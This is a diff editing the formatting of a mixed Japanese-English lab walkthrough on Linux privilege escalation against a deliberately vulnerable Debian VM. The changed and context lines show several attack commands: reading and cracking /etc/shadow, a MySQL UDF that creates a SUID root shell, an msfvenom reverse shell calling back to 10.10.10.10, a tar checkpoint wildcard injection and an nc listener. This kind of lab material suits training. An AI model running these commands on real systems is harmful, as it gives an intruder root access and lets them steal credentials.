@@ -33,14 +33,12 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+
 
 ### Not implemented (or log not saved)
 
-```
 
 ### 2. Local Shell
 
@@ -52,7 +50,7 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ## Deploy the Vulnerable Debian VM
 
-```
+```bash
 ssh user@$ip -oHostKeyAlgorithms=+ssh-rsa
 ```
 
@@ -144,7 +142,7 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 
 ### 1. **`/etc/shadow`ファイルの確認**
 
-```
+```bash
 ls -l /etc/shadow
 ```
 
@@ -154,7 +152,7 @@ ls -l /etc/shadow
 
 ### 2. **`/etc/shadow`ファイルの内容を表示**
 
-```
+```bash
 cat /etc/shadow
 ```
 
@@ -180,7 +178,7 @@ echo "root_hash_here" > hash.txt
 
 ### 4. **John the Ripperでハッシュをクラック**
 
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
@@ -262,7 +260,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ### 1. **`compress.sh`スクリプトの確認**
 
-```
+```bash
 cat /usr/local/bin/compress.sh
 ```
 
@@ -271,7 +269,7 @@ cat /usr/local/bin/compress.sh
 
 ### 2. **リバースシェルの作成**
 
-```
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
 ```
 
@@ -305,7 +303,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 
 ### 5. **リバースシェルの準備**
 
-```
+```bash
 nc -nvlp 4444
 ```
 
@@ -405,7 +403,6 @@ Copy the code
 - 通常、このコマンドはユーザーのパスワードを変更するためのプログラムです。
 - しかし、Dirty COWエクスプロイトにより置き換えられたバイナリは、実行時に`root`権限のシェルを起動します。
 - 結果として、攻撃者は`root`権限を取得します。
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
@@ -418,7 +415,6 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
-```bash
 
 - **John the Ripper**:
     - パスワードクラッキングツールで、保存されたパスワードハッシュを解析して平文のパスワードを特定します。
@@ -501,7 +497,6 @@ During the privilege escalation phase, we will prioritize checking for misconfig
 ### 各ステップの説明
 
 ### 1. **`compress.sh`スクリプトの確認**
-```
 
 💡 Why this works  
 Privilege escalation depends on chaining local weaknesses such as sudo misconfiguration, weak file permissions, or credential reuse. If a GTFOBins technique is used, the mechanism is that an allowed binary executes a child process or shell without dropping elevated effective privileges.
